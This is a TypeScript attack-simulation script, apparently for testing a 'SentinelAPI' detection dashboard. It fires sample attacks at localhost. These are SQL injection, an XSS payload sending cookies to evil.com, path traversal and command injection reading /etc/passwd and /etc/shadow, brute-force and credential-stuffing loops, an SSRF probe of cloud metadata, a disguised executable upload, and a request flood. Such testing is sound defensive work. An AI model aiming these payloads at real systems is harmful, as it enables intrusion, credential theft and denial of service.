import * as readline from 'readline';

const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout
});

const pause = () => new Promise<void>(resolve => rl.question('\n>>> Press <Enter> to fire this attack...', () => resolve()));

const BASE_URL = 'http://localhost:3000';

const attacks = [
  {
    name: 'SQL Injection',
    desc: 'Attempting to bypass authentication or extract data by appending SQL commands to the query.',
    run: async () => {
      await fetch(`${BASE_URL}/search?q=admin' UNION SELECT * FROM users--`);
    }
  },
  {
    name: 'Cross-Site Scripting (XSS)',
    desc: 'Injecting malicious JavaScript into the search query to be reflected back to users.',
    run: async () => {
      await fetch(`${BASE_URL}/search?q=<script>fetch('http://evil.com?cookie='+document.cookie)</script>`);
    }
  },
  {
    name: 'Path Traversal',
    desc: 'Manipulating file paths to access sensitive system files like /etc/passwd.',
    run: async () => {
      await fetch(`${BASE_URL}/profile/..%2f..%2f..%2fetc%2fpasswd`);
    }
  },
  {
    name: 'Command Injection',
    desc: 'Executing arbitrary shell commands on the host system via unsanitized input.',
    run: async () => {
      await fetch(`${BASE_URL}/search?q=; cat /etc/shadow`);
    }
  },
  {
    name: 'Brute-force Login',
    desc: 'Trying many different passwords against a single user account quickly.',
    run: async () => {
      for (let i = 0; i < 5; i++) {
        await fetch(`${BASE_URL}/login`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ username: 'admin', password: `wrong${i}` })
        });
      }
    }
  },
  {
    name: 'Credential Stuffing',
    desc: 'Testing a single exposed password across many different usernames.',
    run: async () => {
      for (let i = 0; i < 5; i++) {
        await fetch(`${BASE_URL}/login`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ username: `user${i}`, password: 'exposedPassword123' })
        });
      }
    }
  },
  {
    name: 'SSRF Attempt',
    desc: 'Forcing the server to make a request to its own internal cloud metadata service.',
    run: async () => {
      await fetch(`${BASE_URL}/fetch?url=http://169.254.169.254/latest/meta-data/`);
    }
  },
  {
    name: 'Malicious File Upload',
    desc: 'Uploading a Windows Executable (MZ) disguised as a harmless PNG image.',
    run: async () => {
      const body = new FormData();
      const executable = Uint8Array.from([0x4d, 0x5a, 0x90, 0x00, 0x03, 0x00]);
      body.append('file', new Blob([executable], { type: 'image/png' }), 'innocent.png');
      await fetch(`${BASE_URL}/upload`, {
        method: 'POST',
        body: body
      });
    }
  },
  {
    name: 'Scanner / Attack Tool Signature',
    desc: 'Probing the API using an automated vulnerability scanner tool (sqlmap).',
    run: async () => {
      await fetch(`${BASE_URL}/search?q=test`, {
        headers: { 'User-Agent': 'sqlmap/1.5.8#dev (http://sqlmap.org)' }
      });
    }
  },
  {
    name: 'Endpoint Enumeration',
    desc: 'Rapidly scanning for hidden files or admin panels, resulting in many 404 Not Found errors.',
    run: async () => {
      for (let i = 0; i < 15; i++) {
        await fetch(`${BASE_URL}/hidden-admin-panel-${i}`);
      }
    }
  },
  {
    name: 'Request Flood / DDoS',
    desc: 'Overwhelming the server with a high volume of requests to cause denial of service.',
    run: async () => {
      const promises = [];
      for (let i = 0; i < 50; i++) {
        promises.push(fetch(`${BASE_URL}/search?q=ddos`));
      }
      await Promise.all(promises);
    }
  }
];

async function main() {
  console.log('====================================================');
  console.log('   SentinelAPI Attack Simulation Tool');
  console.log('====================================================\n');
  
  for (const attack of attacks) {
    console.log(`\n[NEXT ATTACK] ${attack.name}`);
    console.log(`Description : ${attack.desc}`);
    await pause();
    console.log(`> Firing ${attack.name} payload...`);
    try {
      await attack.run();
      console.log('> Done. Check the dashboard!');
    } catch (e) {
      console.log('> Error running attack:', (e as Error).message);
    }
  }

  console.log('\nAll attacks simulated successfully.');
  rl.close();
}

main();
